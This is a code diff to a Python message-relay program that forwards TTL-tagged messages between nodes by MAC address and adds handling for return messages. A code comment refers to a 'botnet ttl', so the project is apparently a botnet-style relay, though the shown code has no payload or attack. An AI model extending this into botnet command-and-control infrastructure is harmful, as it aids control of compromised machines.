@@ -45,10 +45,15 @@ def com_loop():                                 # TODO: add check for botnet ttl
         if receive_data.empty():
             continue
         load = receive_data.get(block=False)
-        data, dst_MAC = proccess_msg(load)
+        data, dst_MAC = proccess_msg(load, MAC)
+        if dst_MAC == 'no_rets':
+            write_to_file(data)
+            logging.info('response recived')
         if type(data) == int:
             logging.info("load endpoint reached")
-            com_with_destination(load)
+            data = com_with_destination(load)
+            ret_msg = f'1${data}'
+            receive_data.put(ret_msg)
             continue
         logging.debug(f"sending {data} to {dst_MAC}")
         send_MAC.put((dst_MAC, data))
@@ -144,13 +149,15 @@ def server_listener(server: socket.socket, server_address: tuple, MAC: str, serv
             logging.debug(f"put {MAC}, {data} in send data Queue")
 
 
-def proccess_msg(msg: str):              # msg formats: ttl$endpoint$load, load, flag$load
+def proccess_msg(msg: str, MAC: str):              # msg formats: ttl$endpoint$load, load, flag$load
     if msg.find("$") == -1:
         return (1, "")
     msg = msg.split("$")
     if len(msg) == 3:
         ttl, endpoint, load = msg
         if int(ttl) <= 0:
+            if endpoint == MAC:
+                return (1, "")
             return (load, endpoint)
         ttl = int(ttl) - 1
         flag = False
@@ -165,6 +172,7 @@ def proccess_msg(msg: str):              # msg formats: ttl$endpoint$load, load,
 def choose_next_node(is_ret=False):
     if is_ret:
         MAC = db.next_ret()
+        if MAC == 'no_rets': return MAC
         db.reset_ret(MAC)
         return MAC
     MACs = db.retrive_MACs(2)           
